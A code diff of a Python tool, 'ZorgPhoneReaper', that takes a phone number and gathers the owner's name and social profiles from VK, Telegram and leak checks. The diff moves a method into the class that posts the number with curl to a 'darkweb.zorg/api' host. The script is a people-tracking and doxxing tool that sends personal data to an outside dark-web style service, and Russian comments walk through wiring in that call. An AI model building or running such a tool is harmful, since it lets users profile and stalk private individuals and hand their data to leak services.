@@ -5,17 +5,12 @@ from bs4 import BeautifulSoup
 import subprocess
 
 class ZorgPhoneReaper:
-    import subprocess
-
-# ВМЕСТО ЭТОГО:
-# subprocess.run(["curl", "http://darkweb.zorg/api", "-d", f"phone={phone}"])
-
-# ИСПОЛЬЗУЙТЕ ЭТО (ВНУТРИ КЛАССА):
-def _darkweb_scan(self):
-    subprocess.run(["curl", "-s", "http://darkweb.zorg/api", "-d", f"phone={self.phone}"])
     def __init__(self, phone):
         self.phone = phone
         self.data = {"name": "N/A", "soc_networks": []}
+
+    def _darkweb_scan(self):
+        subprocess.run(["curl", "-s", "http://darkweb.zorg/api", "-d", f"phone={self.phone}"])
 
     def _vk_hunt(self):
         try:
@@ -26,7 +21,7 @@ def _darkweb_scan(self):
             if name_tag:
                 self.data["name"] = name_tag.get("title", "N/A")
                 self.data["soc_networks"].append(f"VK: {url}")
-        except Exception as e:
+        except Exception:
             pass
 
     def _telegram_scan(self):
@@ -51,11 +46,12 @@ def _darkweb_scan(self):
             return {"error": "НЕДЕЙСТВИТЕЛЬНЫЙ НОМЕР"}
         
         self._vk_hunt()
-        self._darkweb_scan() 
+        self._darkweb_scan()
         self._telegram_scan()
         self._leak_check()
         
         return self.data
+
 
 if __name__ == "__main__":
     phone = input("ВВЕДИТЕ НОМЕР (+7XXX...): ")
